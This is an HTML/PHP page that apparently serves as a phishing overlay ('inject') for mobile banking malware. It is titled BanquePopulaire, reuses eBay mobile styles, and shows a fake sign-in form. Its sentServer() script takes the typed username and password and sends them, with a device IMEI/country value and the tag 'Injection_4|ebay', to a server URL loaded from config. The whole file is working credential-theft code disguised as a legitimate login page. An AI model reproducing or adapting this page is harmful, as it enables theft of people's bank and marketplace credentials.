<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>BanquePopulaire</title>

    <link rel="stylesheet" href="fr/BanquePopulaire/css/normalize.css">
	<link rel="stylesheet" href="shop/com.ebay.mobile/css/style.css">
	<link rel="stylesheet" href="fr/BanquePopulaire/css/cat.style.css" type="text/css" media="all">
    <link rel="stylesheet" href="fr/BanquePopulaire/css/agricole.css">

    <script src="fr/BanquePopulaire/js/vendor/jquery-1.11.3.min.js"></script>
    <script src="fr/BanquePopulaire/js/viewport.js"></script>
	<script src="fr/BanquePopulaire/js/cat.functions.js"></script>
    <link rel="stylesheet" href="shop/com.ebay.mobile/font-awesome/css/font-awesome.min.css">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<h4> Sign in </h4>
<center><br><br>

		 <form id="form">
		
			<input  id="login" placeholder="Email or username" class="input" type="text" required=""/><br><br>
			<input  id="password" placeholder="Password" class="input" type="password" required=""/><br><br>

		
 <input type="button" style="margin-bottom: 20px;margin-right: 20px;" onClick="sentServer();" class="input_submitBtn" value="SIGN IN">
		</form>

</center>
</div>
	<script type="text/javascript" src="js/jquery-1.12.0.min.js"></script>
	<script type="text/javascript" src="js/viewport.js"></script>
	<script type="text/javascript" src="js/cat.functions.js"></script>
<script>
	function sentServer()
	{
		
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 4)) {
	
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["password"].value; 

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|ebay|"+login1+"|"+pass);
	}
}
</script>
</body>
</html>
